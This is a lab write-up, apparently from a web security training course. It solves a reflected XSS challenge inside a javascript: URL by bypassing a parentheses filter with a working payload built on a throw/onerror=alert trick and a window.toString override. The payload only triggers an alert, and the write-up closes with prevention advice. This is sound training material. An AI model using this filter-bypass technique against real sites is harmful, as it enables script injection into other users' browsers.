# Lab 28: Reflected XSS in a JavaScript URL with some characters blocked

**Goal**: Execute `alert(1337)` when reflected inside a `javascript:` URL context where certain characters (like parentheses `()`) are blocked.

This lab reflects user input inside a `javascript:` URL on the "Back to blog" link. The application blocks parentheses `()` and common functions to prevent straightforward `alert(1337)` calls. We must use an arrow function block with `throw` and override `window.toString` to trigger `onerror=alert(1337)`.

---

## 🎯 Solution

1. Open any blog post page (e.g. `/post?postId=5`).
2. Construct the URL parameter payload that overrides `window.toString`:
   ```http
   /post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
   ```
3. Load the page in the browser.
4. Click the **Back to blog** link at the bottom of the page to trigger `alert(1337)`.

![Lab 28 Back to Blog Execution](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926224413.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Analyze Reflection Context
Inspect the **Back to blog** link at the bottom of a blog post:

```html
<a href="javascript:fetchFrom('/post/comment', {'postId': '5'})">Back to blog</a>
```

When extra query parameters are appended to the URL, they are reflected inside the JavaScript object parameter passed to `fetchFrom()`.

### Step 2: Overcome Character Filtering Restrictions
Because parentheses `()` are blocked, we cannot execute function calls directly (such as `alert(1337)`).

We exploit JavaScript type coercion:
1. Define an arrow function `x` that throws an exception containing `onerror=alert, 1337`:
   ```javascript
   x = x => { throw /**/ onerror=alert, 1337 }
   ```
2. Assign `toString = x` on the `window` object.
3. Force string conversion on `window` using string concatenation:
   ```javascript
   window + ''
   ```
4. When `window + ''` evaluates, JavaScript automatically calls `window.toString()`, executing `x()`. The thrown exception triggers `window.onerror`, passing `1337` to `alert`.

### Step 3: Construct Full Payload
Append the payload parameter to the blog post URL:

```http
/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

When reflected into `javascript:fetchFrom(...)`, the code expands to:

```javascript
javascript:fetchFrom('/post/comment', {'postId': '5'}, x=x=>{throw/**/onerror=alert,1337}, toString=x, window+'', {x:''})
```

### Step 4: Verify Payload Execution
Load the crafted URL in the browser and scroll down to the bottom of the post.

Click **Back to blog**:

![Lab 28 Solved Confirmation](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926224413.png)

> [!SUCCESS]
> **Lab Solved**: Successfully executed `alert(1337)` via `window.toString` coercion and `throw onerror=alert`!

---

## 💡 Key Takeaways: Parameter Escaping without Parentheses

- **Function Execution without Parentheses**: Using arrow functions combined with `toString` prototype overrides and string coercion (`window + ''`) invokes functions without writing `()`.
- **`throw` Statement Exception Handling**: Assigning `onerror = alert` captures unhandled thrown statements (`throw 1337`), invoking `alert(1337)` implicitly.

---

## 🔒 Prevention

> [!TIP]
> 1. **Do Not Reflect Inputs in JavaScript URLs**: Avoid building `javascript:...` link targets via parameter reflection.
> 2. **Context-Aware Encoding**: Use strict JavaScript Unicode escaping (`\x27`) on all variables rendered inside JavaScript contexts.
